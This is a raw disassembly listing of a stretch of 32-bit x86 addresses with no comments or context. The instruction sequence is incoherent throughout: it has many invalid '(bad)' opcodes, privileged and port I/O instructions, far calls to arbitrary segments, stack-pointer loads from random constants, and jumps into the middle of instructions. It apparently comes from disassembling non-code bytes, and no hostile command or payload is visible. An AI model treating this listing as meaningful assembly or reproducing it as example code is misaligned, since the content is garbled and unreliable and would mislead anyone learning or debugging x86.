  4020e4:	inc    esp
  4020e5:	jo     0x40211b
  4020e7:	mov    edi,0x6767e3ee
  4020ec:	push   ecx
  4020ed:	and    eax,0x7ece4c9b
  4020f2:	add    edx,esi
  4020f4:	push   edi
  4020f5:	std    
  4020f6:	fisttp DWORD PTR [ebx-0x35]
  4020f9:	mov    al,BYTE PTR [edx-0x8e0dcde]
  4020ff:	int    0x85
  402101:	cmp    esp,esp
  402103:	aaa    
  402104:	call   0xe574:0x3cdd7bd7
  40210b:	adc    eax,0xb7ac2ff2
  402110:	ds iret 
  402112:	inc    ebx
  402113:	add    ecx,ecx
  402115:	jo     0x4020ed
  402117:	daa    
  402118:	jge    0x4020d5
  40211a:	dec    edx
  40211b:	test   dh,0x53
  40211e:	cmp    al,0x16
  402120:	pop    ecx
  402122:	in     al,dx
  402123:	add    ch,bl
  402125:	arpl   WORD PTR [edx-0x34],bp
  402128:	jnp    0x40216b
  40212a:	shr    BYTE PTR [esi+0x3e],0xf8
  40212e:	xchg   esi,eax
  40212f:	mov    esp,0x325b5ae9
  402134:	xchg   ecx,eax
  402135:	addr16 or eax,0x7d96cd26
  40213b:	inc    ebx
  40213c:	sub    bh,BYTE PTR [ebp-0x1b]
  40213f:	fisubr DWORD PTR [ecx]
  402141:	pop    ebp
  402142:	mov    esp,DWORD PTR [edi-0x70]
  402145:	out    dx,eax
  402146:	add    eax,0xcdefa6
  40214b:	ret    0x740b
  40214e:	pop    edi
  40214f:	and    eax,0xa1406b48
  402154:	scas   eax,DWORD PTR es:[edi]
  402155:	lods   al,BYTE PTR ds:[esi]
  402156:	add    dl,BYTE PTR [edx]
  402158:	and    eax,0xfffffffb
  40215b:	or     BYTE PTR [edi+0x20],bh
  40215e:	cmp    BYTE PTR [ebx],dl
  402160:	xor    ecx,ebx
  402162:	cmp    al,0xf7
  402164:	mov    ecx,0xe7a5d307
  402169:	mov    ecx,0xf1d1f37a
  40216e:	imul   ecx,DWORD PTR [edi-0x7c41b36f],0x1bac3ed0
  402178:	popa   
  402179:	sar    edi,1
  40217b:	leave  
  40217c:	mov    WORD PTR [edx-0x28],?
  40217f:	daa    
  402180:	je     0x4021de
  402182:	cld    
  402183:	xor    ch,dh
  402185:	dec    ebx
  402186:	jno    0x4021ca
  402188:	rep lods al,BYTE PTR ds:[esi]
  40218a:	lahf   
  40218b:	mov    eax,ds:0x6e918802
  402190:	out    0x9a,al
  402192:	adc    al,ah
  402194:	imul   ecx,DWORD PTR [eax+0x5e2bf941],0x3d87bbde
  40219e:	stc    
  40219f:	xchg   DWORD PTR [esi],edi
  4021a1:	in     eax,dx
  4021a2:	sub    ebx,esp
  4021a4:	add    BYTE PTR [edx-0x6b],ah
  4021a7:	pushf  
  4021a8:	pop    es
  4021a9:	and    ch,0x20
  4021ac:	repz fidiv WORD PTR [ecx-0x59ef07bf]
  4021b3:	dec    esp
  4021b4:	pminub mm4,QWORD PTR [eax]
  4021b7:	sti    
  4021b8:	jecxz  0x402181
  4021ba:	xor    DWORD PTR [edi-0x3a],ebx
  4021bd:	cmp    al,0x8e
  4021c0:	push   es
  4021c1:	es push es
  4021c3:	xor    al,0x1b
  4021c5:	js     0x4021ad
  4021c7:	xor    dl,BYTE PTR [esp+edx*4+0x58]
  4021cb:	xchg   ebx,eax
  4021cc:	mov    ebp,0x5e87dfe3
  4021d1:	dec    ebp
  4021d2:	mov    dh,0x72
  4021d4:	adc    esp,DWORD PTR [edx+0x4]
  4021d7:	xchg   edi,eax
  4021d8:	and    esi,ecx
  4021da:	sahf   
  4021db:	test   BYTE PTR [esi-0x38],cl
  4021de:	mov    edi,0x651c7d4e
  4021e3:	mov    dl,0x40
  4021e5:	adc    DWORD PTR [ebx-0x41],esp
  4021e8:	cmp    DWORD PTR [ebx-0x62305dde],ecx
  4021ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021ef:	das    
  4021f0:	pop    esp
  4021f1:	lds    esp,FWORD PTR [ebx+0x6a]
  4021f4:	in     al,0x8d
  4021f6:	dec    ebx
  4021f7:	push   edi
  4021f8:	xor    esp,DWORD PTR [esi-0x55]
  4021fb:	cdq    
  4021fc:	ja     0x40220a
  4021fe:	xchg   edx,eax
  4021ff:	or     dh,BYTE PTR [ebp+0x7f53e088]
  402205:	imul   ebp,DWORD PTR [edx+0x55],0xffffffe4
  402209:	add    DWORD PTR [ecx+0x5],eax
  40220c:	adc    ecx,edx
  40220e:	adc    DWORD PTR [ebx-0x3c],0x760a468f
  402215:	sub    al,0xa9
  402217:	push   esp
  402218:	aam    0x91
  40221a:	push   DWORD PTR [ebp-0x28d3fe3]
  402220:	push   ds
  402221:	shl    DWORD PTR [ebx+0x1b],cl
  402224:	daa    
  402225:	mov    ecx,0x5500c3c4
  40222a:	and    BYTE PTR [eax],dh
  40222c:	(bad)  
  40222d:	dec    esi
  40222e:	mov    esp,0xda07cccc
  402233:	leave  
  402234:	pop    ecx
  402235:	mov    BYTE PTR [eax-0x1373c350],bl
  40223b:	in     al,dx
  40223c:	sti    
  40223d:	cwde   
  40223e:	stc    
  40223f:	out    0x6a,al
  402241:	push   edi
  402242:	iret   
  402243:	mov    ch,0x6
  402245:	cmp    edx,esi
  402247:	dec    esp
  402248:	retf   0x2ea5
  40224b:	inc    bx
  40224d:	xor    al,0xee
  40224f:	dec    ebx
  402250:	sbb    eax,0x3980e5f5
  402255:	jo     0x402208
  402257:	int3   
  402258:	and    eax,0x10e3420b
  40225d:	jle    0x402288
  40225f:	cli    
  402260:	jg     0x4021fa
  402262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402263:	(bad)  
  402264:	(bad)  
  402265:	or     DWORD PTR [ebx+0x5f],ebx
  402268:	and    DWORD PTR [edx+0x4f11cd46],ecx
  40226e:	sub    DWORD PTR [edi-0x4574d5b8],0x70
  402275:	xlat   BYTE PTR ds:[ebx]
  402276:	add    ebx,ebx
  402278:	mov    ecx,0xc1ac563f
  40227d:	and    BYTE PTR ds:0x70a31a9b,cl
  402283:	js     0x402245
  402285:	nop
  402286:	xor    eax,0xf2e273b0
  40228b:	out    0x1c,al
  40228d:	cmp    eax,0x75232f97
  402292:	jae    0x402273
  402294:	inc    eax
  402295:	sub    ecx,edi
  402297:	mov    cl,0xe5
  402299:	sub    eax,0x18bc4842
  40229e:	lahf   
  40229f:	or     al,0x26
  4022a1:	inc    eax
  4022a2:	ins    BYTE PTR es:[edi],dx
  4022a3:	mov    dl,0x99
  4022a5:	scas   al,BYTE PTR es:[edi]
  4022a6:	or     al,0xb4
  4022a8:	mov    ss,WORD PTR [edi-0x5a]
  4022ab:	outs   dx,BYTE PTR ds:[esi]
  4022ac:	inc    edi
  4022ad:	or     al,0x65
  4022af:	sbb    DWORD PTR [ebx-0xa],esi
  4022b2:	pop    edi
  4022b3:	ja     0x402251
  4022b5:	test   eax,0xe30b8b3a
  4022ba:	pop    ebx
  4022bb:	jno    0x40230b
  4022bd:	enter  0x5855,0xba
  4022c1:	or     al,0x41
  4022c3:	and    ecx,DWORD PTR [ebx-0x3792b04f]
  4022c9:	int3   
  4022ca:	add    bh,ah
  4022cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022cd:	or     BYTE PTR [edi+0x7ebda558],cl
  4022d3:	push   0xfffffff0
  4022d5:	(bad)  
  4022d6:	repnz mov dl,0x71
  4022d9:	mov    edx,0x69ac4168
  4022de:	sahf   
  4022df:	sbb    ebx,eax
  4022e1:	push   esp
  4022e2:	ja     0x402270
  4022e4:	mov    eax,0x2aa52e69
  4022e9:	sbb    edx,DWORD PTR [edx+0x36]
  4022ec:	jbe    0x40227b
  4022ee:	or     eax,0xb871b94a
  4022f3:	adc    ecx,DWORD PTR [esp+ebx*2-0x3]
  4022f7:	sbb    ecx,DWORD PTR [ebp+0x16]
  4022fa:	ja     0x4022ba
  4022fc:	ins    BYTE PTR es:[edi],dx
  4022fd:	xchg   esi,eax
  4022fe:	fwait
  4022ff:	(bad)  
  402300:	pop    esi
  402301:	fidivr WORD PTR [edx+0x3e]
  402304:	xchg   esi,eax
  402305:	aaa    
  402306:	add    ebp,edi
  402308:	add    DWORD PTR [edi],esp
  40230a:	stos   DWORD PTR es:[edi],eax
  40230b:	cmp    eax,0x2da102ad
  402310:	xor    esp,eax
  402312:	sbb    BYTE PTR [eax],bh
  402314:	out    0x73,eax
  402316:	jns    0x402379
  402318:	ret    0x227d
  40231b:	test   ecx,0x75d5b847
  402321:	aaa    
  402322:	fisttp WORD PTR [eax+0x31c7dfe4]
  402328:	clc    
  402329:	scas   al,BYTE PTR es:[edi]
  40232a:	and    DWORD PTR [esi],esp
  40232c:	fwait
  40232d:	mov    ds:0x52d5ed4b,al
  402332:	stos   BYTE PTR es:[edi],al
  402333:	sub    BYTE PTR ds:0x7ef6d83b,ah
  402339:	dec    esp
  40233a:	lods   al,BYTE PTR ds:[esi]
  40233b:	dec    eax
  40233c:	test   al,0x58
  40233e:	sbb    al,0x86
  402340:	lods   al,BYTE PTR ds:[esi]
  402341:	retf   0x6a3b
  402344:	cmp    bl,BYTE PTR [eax]
  402346:	jg     0x4022e3
  402348:	adc    al,0x30
  40234a:	xor    DWORD PTR [esi],ebx
  40234c:	je     0x4023b8
  40234e:	and    eax,0xbcc03edd
  402353:	out    0x24,eax
  402355:	mov    edx,DWORD PTR [ecx-0x6e]
  402358:	sahf   
  402359:	xor    DWORD PTR [edx+ebp*8+0x6382d450],0xdd9b8cf3
  402364:	jbe    0x402319
  402366:	lds    esi,FWORD PTR [ebp-0x77a6e344]
  40236c:	out    dx,al
  40236d:	cmp    DWORD PTR [edx+0x26],esp
  402370:	bnd call 0x50f842d6
  402376:	jge    0x402389
  402378:	xor    DWORD PTR [ecx+0x71],edx
  40237b:	xlat   BYTE PTR ds:[ebx]
  40237c:	xor    DWORD PTR [edx],edi
  40237e:	push   edx
  40237f:	das    
  402380:	outs   dx,BYTE PTR ds:[esi]
  402381:	test   al,0x8e
  402383:	fcmovne st,st(0)
  402385:	mov    ah,0x59
  402387:	ret    
  402388:	jo     0x4023eb
  40238a:	push   ss
  40238b:	jl     0x4023b2
  40238d:	retf   0x1e77
  402390:	rcl    BYTE PTR [ebp+0x58],cl
  402393:	popa   
  402394:	sub    dh,BYTE PTR [esp+ebp*4-0x79]
  402398:	stos   BYTE PTR es:[edi],al
  402399:	inc    edi
  40239a:	push   ds
  40239b:	sub    eax,0xf24227eb
  4023a0:	popa   
  4023a1:	jbe    0x402386
  4023a3:	stos   BYTE PTR es:[edi],al
  4023a4:	fwait
  4023a5:	xor    al,0x3d
  4023a7:	(bad)  
  4023a8:	loop   0x40232d
  4023aa:	xchg   edi,eax
  4023ab:	jo     0x4023b7
  4023ad:	in     eax,0x63
  4023af:	rcr    DWORD PTR [edx-0x781a3c13],0xeb
  4023b6:	sub    al,0x87
  4023b8:	inc    ebx
  4023ba:	shl    BYTE PTR ds:0x7fe22e2c,0x2e
  4023c1:	sub    esp,DWORD PTR [ecx-0x7fc07eb5]
  4023c7:	mov    eax,0xdac67d65
  4023cc:	jmp    0x4023ec
  4023ce:	mov    ah,0x82
  4023d0:	jl     0x402352
  4023d2:	daa    
  4023d3:	cs xchg esp,eax
  4023d5:	js     0x4023f9
  4023d7:	ret    0x8c66
  4023da:	xor    eax,0xff3c1127
  4023df:	std    
  4023e0:	inc    ebx
  4023e1:	jmp    0x4023d0
  4023e3:	push   edx
  4023e4:	push   ebp
  4023e5:	lods   al,BYTE PTR ds:[esi]
  4023e6:	(bad)  [ecx+0x7409613]
  4023ec:	fwait
  4023ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ee:	mov    ds:0x46c89fd8,eax
  4023f3:	mov    dl,bh
  4023f5:	and    al,BYTE PTR [esi+edi*8-0x2ce525c7]
  4023fc:	mov    ds:0x2b67c2c1,al
  402401:	stos   BYTE PTR es:[edi],al
  402402:	(bad)  [ebp+0x12f460aa]
  402408:	xor    bl,BYTE PTR [eax]
  40240a:	(bad)  
  40240b:	pop    ebx
  40240c:	jbe    0x402447
  40240e:	sub    dl,BYTE PTR ds:0xaa79fd38
  402414:	xchg   esi,eax
  402415:	data16 cli 
  402417:	loop   0x402494
  402419:	cdq    
  40241a:	add    eax,0xc4da50f5
  40241f:	xchg   edi,eax
  402420:	out    0xca,al
  402422:	cmp    eax,0x9cbd9452
  402427:	lahf   
  402428:	les    edx,FWORD PTR [edx+0x22]
  40242b:	sub    eax,0x965d31f1
  402430:	xchg   ebp,eax
  402431:	bsf    eax,eax
  402434:	shr    DWORD PTR [eax+ebx*4-0x43957886],1
  40243b:	(bad)  
  40243c:	fild   DWORD PTR [edx-0x7e]
  40243f:	hlt    
  402440:	mov    cl,BYTE PTR [esi+esi*2+0x7183c7d1]
  402447:	mov    ebp,0x1e3941e
  40244c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40244d:	iret   
  40244e:	cmp    eax,DWORD PTR [eax-0x17]
  402451:	push   ebp
  402452:	dec    eax
  402453:	inc    esp
  402454:	push   esp
  402455:	and    al,0x60
  402457:	hlt    
  402458:	sbb    BYTE PTR [ebx+0x4d],ch
  40245b:	repnz sar bh,0xda
  40245f:	mov    edi,0xa07c756d
  402464:	sub    edi,DWORD PTR [edx-0x37]
  402467:	aam    0x4a
  402469:	(bad)  
  40246a:	retf   0x2bd8
  40246d:	gs add bh,ch
  402470:	pop    DWORD PTR [edi]
  402472:	adc    edx,0x52
  402475:	mov    dh,0x44
  402477:	lock lods al,BYTE PTR ds:[esi]
  402479:	sahf   
  40247a:	sbb    cl,BYTE PTR [ecx-0x71af67ea]
  402480:	pop    edx
  402481:	aam    0x93
  402483:	js     0x402407
  402485:	mov    ds:0xa96d0044,eax
  40248a:	nop
  40248b:	inc    ebp
  40248c:	das    
  40248d:	sub    DWORD PTR [ebp+0x72],0xffffff83
  402491:	ss xchg dx,ax
  402494:	call   0x50ce229d
  402499:	pop    esi
  40249a:	add    al,0x49
  40249c:	xchg   edi,eax
  40249d:	iret   
  40249e:	outs   dx,BYTE PTR ds:[esi]
  40249f:	adc    al,ch
  4024a1:	shr    eax,cl
  4024a3:	ret    
  4024a4:	mov    DWORD PTR [ecx],ebx
  4024a6:	pop    ecx
  4024a7:	add    ch,BYTE PTR [eax]
  4024a9:	call   0xccf9:0x2638084e
  4024b0:	push   cs
  4024b1:	(bad)  
  4024b2:	iret   
  4024b3:	stos   BYTE PTR es:[edi],al
  4024b4:	sbb    dl,BYTE PTR [esi-0xb]
  4024b7:	cs out dx,al
  4024b9:	mov    ds:0x8feba8ab,eax
  4024be:	in     al,0x2d
  4024c0:	and    esp,DWORD PTR [esi]
  4024c2:	sar    dh,cl
  4024c4:	push   esi
  4024c5:	clc    
  4024c6:	jbe    0x4024c8
  4024c8:	add    al,0x1c
  4024ca:	jmp    0x402489
  4024cc:	sub    cl,bl
  4024ce:	mov    eax,ds:0x34411f4b
  4024d3:	mov    edx,0xb96c5414
  4024d8:	or     DWORD PTR [ebp-0x4f6ce28c],eax
  4024de:	sahf   
  4024df:	sbb    bh,BYTE PTR [edi]
  4024e1:	lds    edi,FWORD PTR [eax+ebx*4+0x4e]
  4024e5:	out    dx,al
  4024e6:	mov    cl,0x67
  4024e8:	test   eax,0xd50af7b9
  4024ed:	sar    BYTE PTR [ebp+edx*1+0x1c],1
  4024f1:	and    ch,BYTE PTR [ecx+eiz*8]
  4024f4:	int    0xb7
  4024f6:	dec    edx
  4024f7:	scas   eax,DWORD PTR es:[edi]
  4024f8:	xchg   ecx,eax
  4024f9:	mov    ds:0xbbe9e611,al
  4024fe:	xchg   esi,eax
  4024ff:	call   0x87957e5
  402504:	xor    ch,BYTE PTR [esi+0x41ccadcc]
  40250a:	arpl   cx,si
  40250c:	mov    ah,BYTE PTR [ebx-0x6a5c8bc8]
  402512:	mov    bl,BYTE PTR [ebx]
  402514:	retf   
  402515:	addr16 jae 0x40253a
  402518:	out    0x30,al
  40251a:	mov    eax,ds:0xca02c61f
  40251f:	loope  0x4024bb
  402521:	jnp    0x402529
  402523:	out    dx,al
  402524:	int3   
  402525:	popa   
  402526:	mov    esi,0x718dd543
  40252b:	mov    ebx,0xaa2ac539
  402530:	xor    al,BYTE PTR [ebx]
  402532:	mov    esp,0xf4c0c807
  402537:	ss jno 0x402583
  40253a:	lock int 0x18
  40253d:	mov    ebx,0x6defa1db
  402542:	jle    0x4024cd
  402544:	push   0x68
  402546:	sub    al,0x37
  402548:	cli    
  402549:	inc    ebp
  40254a:	aas    
  40254b:	sti    
  40254c:	mov    bh,0x62
  40254e:	push   ds
  40254f:	jmp    0xeb42:0x4f3d08dc
  402556:	push   ss
  402557:	or     eax,0x8c2b9853
  40255c:	adc    DWORD PTR [ebx-0x330d37cd],esi
  402562:	fdivr  QWORD PTR [ebx]
  402564:	pop    eax
  402565:	stos   DWORD PTR es:[edi],eax
  402566:	mov    cl,0xd5
  402568:	pop    edx
  402569:	xlat   BYTE PTR ds:[ebx]
  40256a:	xchg   edx,eax
  40256b:	stc    
  40256c:	lock mov esp,0xd3f9d72a
  402572:	js     0x4024f4
  402574:	jo     0x40253a
  402576:	xchg   esi,eax
  402577:	addr16 loopne 0x402507
  40257a:	jecxz  0x4025ae
  40257c:	stos   DWORD PTR es:[edi],eax
  40257d:	fcomp  DWORD PTR [esi]
  40257f:	pop    ds
  402580:	mov    esp,0xfa75de83
  402585:	pop    esi
  402586:	into   
  402587:	mov    ah,0x64
  402589:	add    eax,0x88308a80
  40258e:	arpl   WORD PTR [eax+0x6c],ax
  402591:	retf   
  402592:	pop    esp
  402593:	push   es
  402594:	gs ins DWORD PTR es:[edi],dx
  402596:	aam    0x63
  402598:	xchg   eax,ebx
  40259a:	add    eax,0x9eb63e6a
  40259f:	in     eax,dx
  4025a0:	test   DWORD PTR [esi+eiz*8+0x375b2e22],0x6a6d4bda
  4025ab:	mov    bh,ch
  4025ad:	cmp    bh,BYTE PTR [ebx]
  4025af:	fwait
  4025b0:	sub    eax,0xedb882c9
  4025b5:	icebp  
  4025b6:	cdq    
  4025b7:	and    eax,0x57a9325c
  4025bc:	call   0xbb88:0xdd39f75b
  4025c3:	sub    eax,0x26dbaa72
  4025c8:	inc    esi
  4025c9:	sbb    ecx,DWORD PTR [ebx-0x7b]
  4025cc:	data16 fidivr WORD PTR [edi-0x11]
  4025d0:	leave  
  4025d1:	mov    al,ds:0xeea13c21
  4025d6:	mov    bh,0x9f
  4025d8:	mov    dh,0xd4
  4025da:	call   0x1c41:0x9f72567
  4025e1:	cdq    
  4025e2:	(bad)  
  4025e3:	mov    al,0xe2
  4025e5:	test   DWORD PTR [ebx],0xa5b6787e
  4025eb:	or     BYTE PTR [edi+0x5e],ch
  4025ee:	mov    al,0x56
  4025f0:	mov    ebx,DWORD PTR [eax-0x32]
  4025f3:	enter  0xe2a8,0x5b
  4025f7:	mov    eax,0x66c7fb17
  4025fc:	(bad)  
  4025fd:	fwait
  4025fe:	mov    bh,0x86
  402600:	pop    eax
  402601:	mov    cr1,edx
  402604:	add    edx,edx
  402606:	retf   0x4627
  402609:	jl     0x402591
  40260b:	mov    ebx,0xa25f2777
  402610:	xor    edi,eax
  402612:	retf   0xf389
  402615:	dec    ecx
  402616:	adc    DWORD PTR [ecx],esi
  402618:	mov    bh,0x95
  40261a:	pop    ss
  40261b:	int    0x3d
  40261d:	stos   DWORD PTR es:[edi],eax
  40261e:	mov    DWORD PTR [esi+eiz*8-0xada1779],ebx
  402625:	jp     0x40260f
  402627:	and    ch,BYTE PTR [ebx+0x9]
  40262a:	nop
  40262b:	mov    edi,0x9548937a
  402630:	xor    edi,eax
  402632:	inc    ebp
  402633:	xchg   ebp,eax
  402635:	call   FWORD PTR ds:0x23fe03bb
  40263b:	rcr    DWORD PTR [edi+0x1a],1
  40263e:	mov    bh,0xc8
  402640:	add    DWORD PTR [edx-0x6b07c9e7],esi
  402646:	or     BYTE PTR [eax-0x1a32fe40],dl
  40264c:	loopne 0x4026c9
  40264e:	(bad)  
  402650:	dec    ecx
  402651:	cmc    
  402652:	push   eax
  402653:	xor    esi,DWORD PTR [ebp-0x34d765b8]
  402659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40265a:	or     dl,al
  40265c:	xor    eax,0xb29d2284
  402661:	sti    
  402662:	(bad)  [ebx+0x401936aa]
  402668:	outs   dx,DWORD PTR ds:[esi]
  402669:	pop    ebx
  40266a:	ret    0x4aa
  40266d:	sub    eax,0x34eddb07
  402672:	sub    ebx,DWORD PTR [esi+0x44]
  402675:	xor    al,0x33
  402677:	mov    gs,WORD PTR ds:0xb3f7007
  40267d:	push   ebx
  40267e:	sar    ah,0x2a
  402681:	loopne 0x40266f
  402683:	xchg   ebp,eax
  402684:	inc    ebx
  402685:	addr16 or dh,0xe1
  402689:	add    al,0xcc
  40268b:	nop
  40268c:	sbb    eax,DWORD PTR [eax+0x58]
  40268f:	mov    ebx,0xe14397ac
  402694:	in     al,dx
  402695:	in     eax,0x35
  402697:	mov    al,ds:0x5dbd7d07
  40269c:	je     0x4026c0
  40269e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40269f:	mov    ecx,0x1d7b0ab6
  4026a4:	pop    edi
  4026a5:	and    eax,0x20c55d9e
  4026aa:	call   0xeed36b29
  4026af:	int    0x7b
  4026b1:	bound  ebx,QWORD PTR [ecx+0x61]
  4026b4:	dec    esi
  4026b5:	in     eax,dx
  4026b6:	je     0x402660
  4026b8:	aas    
  4026b9:	and    al,0x80
  4026bb:	cmp    bh,ch
  4026bd:	data16 or dl,cl
  4026c0:	retf   0x2f84
  4026c3:	push   0x72223039
  4026c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026c9:	xor    dl,BYTE PTR [edx]
  4026cb:	cmp    eax,0xbddcd12a
  4026d0:	xor    eax,0x3e80034a
  4026d5:	pop    edx
  4026d6:	fdiv   st(2),st
  4026d8:	add    al,0xe3
  4026da:	leave  
  4026db:	jle    0x4026e3
  4026dd:	pushf  
  4026de:	scas   eax,DWORD PTR es:[edi]
  4026df:	aad    0x61
  4026e1:	cli    
  4026e2:	popa   
  4026e3:	daa    
  4026e4:	mov    WORD PTR [edi],?
  4026e6:	jb     0x402686
  4026e8:	sti    
  4026e9:	out    0x23,al
  4026eb:	clc    
  4026ec:	dec    ecx
  4026ed:	pop    ebx
  4026ee:	retf   0x9b45
  4026f1:	pop    ecx
  4026f2:	icebp  
  4026f3:	es cld 
  4026f5:	or     DWORD PTR [esi-0x2f3690d3],eax
  4026fb:	and    bh,BYTE PTR [eax]
  4026fd:	inc    edi
  4026fe:	loopne 0x402700
  402700:	mov    edx,edx
  402702:	pop    ebp
  402703:	jle    0x4026fc
  402705:	out    0xca,al
  402707:	push   cs
  402708:	sbb    esp,esi
  40270a:	cmp    DWORD PTR [esi],esp
  40270c:	lea    eax,[edi]
  40270e:	or     BYTE PTR [edi+0x6ddbb613],0xa7
  402715:	pop    es
  402716:	inc    ebp
  402717:	pop    esi
  402718:	sbb    al,0xd0
  40271a:	ret    0x5e68
  40271d:	cs dec ebx
  40271f:	mov    bl,0xc
  402721:	pop    esp
  402722:	outs   dx,BYTE PTR ds:[esi]
  402723:	sub    al,0xe3
  402725:	out    dx,al
  402726:	jge    0x402703
  402728:	std    
  402729:	dec    esi
  40272a:	call   0x31201787
  40272f:	inc    ebx
  402730:	xchg   ebx,eax
  402731:	adc    BYTE PTR [ebx+0x2d],0xf8
  402735:	sbb    dl,BYTE PTR [edi+eax*1]
  402738:	jp     0x402786
  40273a:	pusha  
  40273b:	inc    ecx
  40273c:	sub    BYTE PTR [eax+0x3e988b79],al
  402742:	jb     0x402702
  402744:	xchg   esi,eax
  402745:	jecxz  0x40279e
  402747:	popa   
  402748:	ja     0x402765
  40274a:	gs hlt 
  40274c:	mov    ebp,0x3f551b42
  402751:	fadd   st,st(1)
  402753:	cmc    
  402754:	or     bl,al
  402756:	or     al,0xb0
  402758:	shl    bl,cl
  40275a:	add    al,0xcc
  40275c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40275e:	jle    0x40274b
  402760:	sbb    dl,BYTE PTR [esi+edi*8-0x22]
  402764:	mov    dh,0x3e
  402766:	ror    bh,cl
  402768:	xor    esi,0x56
  40276b:	jge    0x4027d2
  40276d:	imul   eax,ebp,0xffffffbb
  402770:	lods   al,BYTE PTR ds:[esi]
  402771:	loop   0x4027d1
  402773:	add    ch,cl
  402775:	(bad)  
  402776:	imul   ebx
  402778:	and    edi,DWORD PTR [eax*2-0x70a3bd32]
  40277f:	add    BYTE PTR ds:0x5dfd6e7f,ah
  402785:	or     BYTE PTR [esi+0x35],ch
  402788:	xor    al,0x7b
  40278a:	and    ebx,edi
  40278c:	fstp   DWORD PTR [ecx]
  40278e:	addr16 arpl bp,bx
  402791:	and    DWORD PTR [ebx],edi
  402793:	pop    es
  402794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402795:	mov    bl,BYTE PTR [ecx+eax*8-0x619745d4]
  40279c:	dec    ebp
  40279d:	adc    eax,0x41a06aea
  4027a2:	adc    ecx,edi
  4027a4:	jnp    0x402740
  4027a6:	(bad)  
  4027a7:	in     al,dx
  4027a8:	pop    ds
  4027a9:	mov    ecx,0xd2930458
  4027ae:	cmc    
  4027af:	jb     0x402804
  4027b1:	mov    bh,0xf8
  4027b3:	data16 and BYTE PTR [ecx+0x3b7a01c0],dh
  4027ba:	pop    ss
  4027bb:	cmc    
  4027bc:	push   edi
  4027bd:	(bad)  
  4027be:	popa   
  4027bf:	mov    cl,0x6b
  4027c1:	ret    
  4027c2:	push   0xffffffb5
  4027c4:	je     0x4027fe
  4027c6:	fistp  QWORD PTR [edx+0xb27e406]
  4027cc:	push   ebp
  4027cd:	das    
  4027ce:	add    eax,0x51ada642
  4027d3:	retf   0x778
  4027d6:	cli    
  4027d7:	and    ebp,DWORD PTR [edx]
  4027d9:	js     0x4027cf
  4027db:	mov    al,0x77
  4027dd:	test   BYTE PTR [edx*1+0x102b2d4d],cl
  4027e4:	pop    ebp
  4027e5:	pop    edx
  4027e6:	xlat   BYTE PTR ds:[ebx]
  4027e7:	leave  
  4027e8:	adc    al,0xc7
  4027ea:	mov    bh,0x5e
  4027ec:	fcomp  QWORD PTR [edx+ebp*8]
  4027ef:	and    al,BYTE PTR [ebx+0x6ec5375c]
  4027f5:	pop    esp
  4027f6:	pusha  
  4027f7:	mov    esi,0xbc944d8c
  4027fc:	dec    edx
  4027fd:	jae    0x40283c
  4027ff:	es push ecx
  402801:	sbb    BYTE PTR [ecx+0x1dc8ca9a],bh
  402807:	cmp    DWORD PTR [ebx-0x35],ebx
  40280a:	jl     0x4027f6
  40280c:	inc    ecx
  40280d:	(bad)  
  40280e:	fistp  DWORD PTR [ebx+0x5463acc2]
  402814:	neg    edi
  402816:	mov    esi,0xc4e54618
  40281b:	pop    ebp
  40281c:	dec    dx
  40281e:	and    edi,DWORD PTR [eax]
  402820:	test   BYTE PTR [ebp-0x4e8a2c98],al
  402826:	sbb    BYTE PTR [ebx],0x9a
  402829:	stos   BYTE PTR es:[edi],al
  40282a:	fstp   DWORD PTR [ecx]
  40282c:	jns    0x4027cb
  40282e:	xor    ebp,DWORD PTR [ecx]
  402830:	sbb    DWORD PTR [eax-0x6c7d3977],0x20146bd0
  40283a:	pop    esp
  40283b:	in     eax,dx
  40283c:	mov    dh,0x55
  40283e:	cwde   
  40283f:	or     bl,BYTE PTR [edx]
  402841:	jmp    0x402816
  402843:	or     ah,bl
  402845:	je     0x4027e3
  402847:	inc    ebp
  402848:	imul   edi,DWORD PTR [edi+0x4f],0x30
  40284c:	jl     0x40286e
  40284e:	fwait
  40284f:	add    cl,BYTE PTR [ecx]
  402851:	outs   dx,BYTE PTR ds:[esi]
  402852:	idiv   DWORD PTR [eax+0x2d]
  402855:	(bad)
  40285a:	shl    bl,cl
  40285c:	icebp  
  40285d:	(bad)  
  40285e:	xor    ah,BYTE PTR [ecx+0x6e6e3fe2]
  402864:	push   ds
  402865:	mov    esi,0x673567ab
  40286a:	dec    esi
  40286b:	jns    0x402853
  40286d:	daa    
  40286e:	sbb    eax,0x4de728cd
  402873:	dec    ebx
  402874:	fwait
  402875:	shl    BYTE PTR [ebx],cl
  402877:	fsub   DWORD PTR [eax-0x48]
  40287a:	clc    
  40287b:	sub    edi,DWORD PTR [eax]
  40287d:	xchg   edi,eax
  40287e:	sbb    al,0x93
  402880:	ds (bad) 
  402883:	test   al,0x4f
  402885:	lods   al,BYTE PTR ds:[esi]
  402886:	dec    esp
  402887:	mov    edi,0xc879092f
  40288c:	lods   eax,DWORD PTR ds:[esi]
  40288d:	push   0xc
  40288f:	or     bh,BYTE PTR [ecx]
  402891:	push   eax
  402892:	xor    al,0x61
  402894:	xchg   esp,eax
  402895:	(bad)  
  402896:	(bad)  
  402897:	mov    dh,0xac
  402899:	cmc    
  40289a:	rol    DWORD PTR [ebp+0x33],1
  40289d:	(bad)  
  40289e:	arpl   WORD PTR [esi-0x6c],bp
  4028a1:	(bad)  
  4028a2:	xor    DWORD PTR [eax+0x11f6f7c8],ebp
  4028a8:	cmp    ebp,DWORD PTR [edi-0x2476ac87]
  4028ae:	push   0xffffff96
  4028b0:	aam    0xba
  4028b2:	adc    dl,BYTE PTR [ebp+edx*4-0x689ca3af]
  4028b9:	js     0x4028f6
  4028bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028bc:	jmp    0xe558:0xc00da95f
  4028c3:	jmp    0x85677310
  4028c8:	repnz mov al,ds:0xd7222835
  4028ce:	fidivr DWORD PTR [ebx]
  4028d1:	pusha  
  4028d2:	xchg   edx,eax
